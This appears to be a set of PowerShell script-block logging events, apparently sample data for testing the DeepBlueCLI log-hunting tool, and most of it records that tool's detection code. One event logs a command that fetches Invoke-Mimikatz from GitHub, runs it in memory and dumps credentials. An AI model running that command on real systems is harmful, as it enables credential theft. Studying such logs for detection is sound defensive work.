{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:31:49.876839Z"},"EventRecordID":568566,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-DDF7-70CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".\\DeepBlue-0.2.ps1 \"\" powershell","ScriptBlockId":"e6f1558a-49ad-4fb6-9e4b-5460f390873f","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:31:49.908186Z"},"EventRecordID":568577,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E7F7-70CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"32040225-2dfc-41e7-a41b-1c0b7f900aec","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:31:57.382827Z"},"EventRecordID":568580,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-00F8-70CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds","ScriptBlockId":"2a9f5c2a-70cb-4d9b-bda7-d3f5559d6b97","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:32:05.661704Z"},"EventRecordID":572445,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-3F17-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"77464062-e183-40c8-8f83-a8f89debf836","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:32:07.371667Z"},"EventRecordID":572448,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-C715-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".\\DeepBlue-0.2.ps1 \"\" powershell","ScriptBlockId":"20e2b219-75fb-4020-8312-50fa462269c9","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:32:13.803106Z"},"EventRecordID":572453,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D215-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"function Check-Command($commandline,$minlength,$regexes,$whitelist,$servicecmd){\r\n    $text=\"\"\r\n    $base64=\"\"\r\n    # Check to see if command is whitelisted\r\n    foreach ($entry in $whitelist) {\r\n        if ($commandline -Match $entry.regex) {\r\n            # Command is whitelisted, return nothing\r\n            return\r\n        }\r\n    }\r\n    #$cmdlength=$commandline.length\r\n    #if ($cmdlength -gt $minlength){\r\n    if ($commandline.length -gt $minlength){\r\n        $text += \"   - Long Command Line: greater than $minlength bytes`n\"\r\n    }\r\n    $text += (Check-Obfu $commandline)\r\n    $text += (Check-Regex $commandline $regexes 0)\r\n    # Check for base64 encoded function, decode and print if found\r\n    # This section is highly use case specific, other methods of base64 encoding and/or compressing may evade these checks\r\n    if ($commandline -Match \"\\-enc.*[A-Za-z0-9/+=]{100}\"){\r\n        $base64= $commandline -Replace \"^.* \\-Enc(odedCommand)? \",\"\"\r\n    }\r\n    ElseIf ($commandline -Match \":FromBase64String\\(\"){\r\n        $base64 = $commandline -Replace \"^.*:FromBase64String\\(\\'*\",\"\"\r\n        $base64 = $base64 -Replace \"\\'.*$\",\"\"\r\n    }\r\n    if ($base64){\r\n        if ($commandline -Match \"Compression.GzipStream.*Decompress\"){\r\n            # Metasploit-style compressed and base64-encoded function. Uncompress it.\r\n            $decoded=New-Object IO.MemoryStream(,[Convert]::FromBase64String($base64))\r\n            $uncompressed=(New-Object IO.StreamReader(((New-Object IO.Compression.GzipStream($decoded,[IO.Compression.CompressionMode]::Decompress))),[Text.Encoding]::ASCII)).ReadToEnd()\r\n            $text += \"  Decoded/decompressed Base64:\" + $uncompressed \r\n            $text += \"   - Base64-encoded and compressed function`n\"\r\n        }\r\n        else{\r\n            $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))\r\n            $text += \"  Decoded Base64:\" + $decoded + \"`n\"\r\n            $text += \"   - Base64-encoded function`n\"\r\n            $text += (Check-Obfu $decoded)\r\n            $text += (Check-Regex $decoded $regexes 0)\r\n            #foreach ($regex in $regexes){\r\n            #    if ($regex.Type -eq 0) { # Image Path match\r\n            #        if ($decoded -Match $regex.regex) {\r\n            #            $text += \"   - \" + $regex.String + \"`n\"\r\n            #        }\r\n            #    }\r\n            #}\r\n        }\r\n    }\r\n    if ($text){\r\n        if ($servicecmd){\r\n            return \"  Service File Name: $commandline`n\" + $text\r\n        }\r\n        Else{\r\n            return \"  Command Line: $commandline`n\" + $text\r\n        }\r\n    }\r\n    return \"\"\r\n}","ScriptBlockId":"8f18030c-7203-4231-bcc9-48e15b755ba1","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.2.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:32:13.804037Z"},"EventRecordID":572454,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D315-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"function Check-Obfu($string){\r\n    # Check how many special characters are in the command. Inspired by Invoke-Obfuscation: https://twitter.com/danielhbohannon/status/778268820242825216\r\n    # There are many ways to do this, including regex. Need a way that doesn't kill the CPU. This works, but isn't super concise. There is probably a\r\n    # better way.\r\n    # \r\n    $obfutext=\"\" # Local variable for return output\r\n    $maxchars=25\r\n    #$obfuchars = \"\\+\", \"\\'\", \"\\}\", \"\\{\"\r\n    #foreach ($char in $obfuchars){\r\n    #\r\n    # I tried to loop through the characters (as the two commented lines above show, but\r\n    # hit problems of variable interpolation. I am probably making a simple mistake.\r\n    # If you can get the above loop working, please email deepblue at backshore dot net. \r\n    # I will repay in an adult beverage \r\n    #\r\n    # In the meantime, this is ugly, but works\r\n    $string2 = $string -replace \"`'\"\r\n    # Compare the length\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars ' characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`{\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars { characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`}\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars } characters`n\"\r\n    }\r\n    $string2 = $string -replace \",\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars , characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`\"\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars double quotes`n\"\r\n    }\r\n    return $obfutext\r\n    #}\r\n}","ScriptBlockId":"a13eb9cb-f628-4425-9432-3baf01282037","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.2.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:32:13.804802Z"},"EventRecordID":572455,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D415-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"function Check-Regex($string,$regexes,$type){\r\n    $regextext=\"\" # Local variable for return output\r\n    foreach ($regex in $regexes){\r\n        if ($regex.Type -eq $type) { # Type is 0 for Commands, 1 for services. Set in regexes.csv\r\n            if ($string -Match $regex.regex) {\r\n               $regextext += \"   - \" + $regex.String + \"`n\"\r\n            }\r\n        }\r\n    }\r\n    return $regextext\r\n}","ScriptBlockId":"f0153903-b6ff-4d2e-85e0-58f260dd007c","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.2.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:32:14.325397Z"},"EventRecordID":572459,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D515-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"ff0b44c8-935b-4463-b0a6-960908f5f434","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:33:28.096914Z"},"EventRecordID":572462,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-A316-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".\\DeepBlue-0.2.ps1 \"\" powershell","ScriptBlockId":"7cd91e8e-6e9d-4e43-8a86-6faa0d55b952","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:33:34.598298Z"},"EventRecordID":572469,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-4018-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ Set-StrictMode -Version 1; $_.PSMessageDetails }","ScriptBlockId":"5e83d0bf-60dc-4c88-96f8-4371f6086574","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:33:34.600063Z"},"EventRecordID":572472,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-4418-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }","ScriptBlockId":"14220dc3-126b-48e8-a7ef-bbf63a19a58f","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:33:34.601088Z"},"EventRecordID":572474,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-C316-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ Set-StrictMode -Version 1; $_.OriginInfo }","ScriptBlockId":"7076bb01-ed1a-4e9c-a048-c9d6a0b4d0b1","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:33:35.043397Z"},"EventRecordID":572487,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-5918-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"13c21c1d-bd20-4a9d-b6b8-0e67d574256b","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:38:42.201889Z"},"EventRecordID":572490,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-C817-71CFA721D301"},"Execution_attributes":{"ProcessID":3392,"ThreadID":5316},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$eventxml.Event.EventData.Data[3].\"#text\"","ScriptBlockId":"33e7e34d-4452-4734-be68-10d5053f3514","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:38:42.204693Z"},"EventRecordID":572492,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-C917-71CFA721D301"},"Execution_attributes":{"ProcessID":3392,"ThreadID":5316},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"b3573454-885f-4b18-970a-4ad281c6fd44","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:38:45.375076Z"},"EventRecordID":572495,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D117-71CFA721D301"},"Execution_attributes":{"ProcessID":3392,"ThreadID":5316},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$eventxml.Event.EventData.Data[4].\"#text\"","ScriptBlockId":"2e189019-32ec-4aaf-8d86-f23f463b565c","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:38:45.376498Z"},"EventRecordID":572497,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D217-71CFA721D301"},"Execution_attributes":{"ProcessID":3392,"ThreadID":5316},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"d0c41f72-89b2-41ac-a625-f7861abaf5f3","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:38:48.413280Z"},"EventRecordID":572500,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D717-71CFA721D301"},"Execution_attributes":{"ProcessID":3392,"ThreadID":5316},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$eventxml.Event.EventData.Data[5].\"#text\"","ScriptBlockId":"52240222-06d7-40f5-ad34-c9a6c4fd478a","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:38:48.416343Z"},"EventRecordID":572502,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-D817-71CFA721D301"},"Execution_attributes":{"ProcessID":3392,"ThreadID":5316},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"a2b8290b-7015-4f79-a98d-61aa1248088e","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:38:51.394512Z"},"EventRecordID":572505,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-DD17-71CFA721D301"},"Execution_attributes":{"ProcessID":3392,"ThreadID":5316},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"$eventxml.Event.EventData.Data[6].\"#text\"","ScriptBlockId":"710f3dd5-4941-41fa-82e0-80e0214be8db","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:38:51.396099Z"},"EventRecordID":572507,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-DE17-71CFA721D301"},"Execution_attributes":{"ProcessID":3392,"ThreadID":5316},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"27d24788-8107-4513-8956-b95216f76545","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:40:17.974943Z"},"EventRecordID":572510,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-551A-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"6edae6ae-1625-4357-9239-0a512c56b86c","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:40:20.563770Z"},"EventRecordID":572513,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-5D1A-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":".\\DeepBlue-0.2.ps1 \"\" powershell","ScriptBlockId":"475fc9c0-2d79-492b-916b-0d39b659443e","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:40:20.569157Z"},"EventRecordID":572514,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-5E1A-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":2,"ScriptBlockText":"<#\r\n.SYNOPSIS\r\n\r\nA PowerShell module for hunt teaming via Windows event logs\r\n.DESCRIPTION\r\n\r\nDeepBlueCLI can automatically determine events that are typically triggered during a majority of successful breaches, including use of malicious command lines including PowerShell. \r\n.Example\r\n\r\nProcess local Windows security event log:\r\n.\\DeepBlue.ps1\r\n.\\DeepBlue.ps1 -log security\r\n.Example\r\nProcess local Windows system event log:\r\n\r\n.\\DeepBlue.ps1 -log system\r\n.\\DeepBlue.ps1 \"\" system\r\n.Example\r\nProcess evtx file:\r\n\r\n.\\DeepBlue.ps1 .\\evtx\\new-user-security.evtx\r\n.\\DeepBlue.ps1 -file .\\evtx\\new-user-security.evtx\r\n.LINK\r\nhttps://github.com/sans-blue-team/DeepBlueCLI\r\n\r\n#>\r\n\r\n# DeepBlueCLI 0.2 Beta\r\n# Eric Conrad, Backshore Communications, LLC\r\n# deepblue <at> backshore <dot> net\r\n# Twitter: @eric_conrad\r\n# http://ericconrad.com\r\n#\r\n\r\nparam ([string]$file=$env:file,[string]$log=$env:log)           \r\n\r\nfunction Main {\r\n    $text=\"\" # Temporary scratch pad variable to hold output text\r\n    $minlength=1000 # Minimum length of command line to alert\r\n    # Load cmd match regexes from csv file, ignore comments\r\n    $regexes = Get-Content \".\\regexes.txt\" | Select-String '^[^#]' | ConvertFrom-Csv\r\n    # Load cmd whitelist regexes from csv file, ignore comments\r\n    $whitelist = Get-Content \".\\whitelist.txt\" | Select-String '^[^#]' | ConvertFrom-Csv \r\n    $logname=Check-Options $file $log\r\n    \"Processing the \" + $logname + \" log...\"\r\n    $filter=Create-Filter $file $logname\r\n    $failedlogons=0 # Count of failed logons (Security event 4625)\r\n    $maxfailedlogons=100 # Alert after this many failed logons\r\n    # Get the events:\r\n    try{\r\n        $events = iex \"Get-WinEvent $filter -ErrorAction Stop\"\r\n    }\r\n    catch {\r\n        Write-Host \"Get-WinEvent $filter -ErrorAction Stop\"\r\n    \tWrite-Host \"Get-WinEvent error: \" $_.Exception.Message 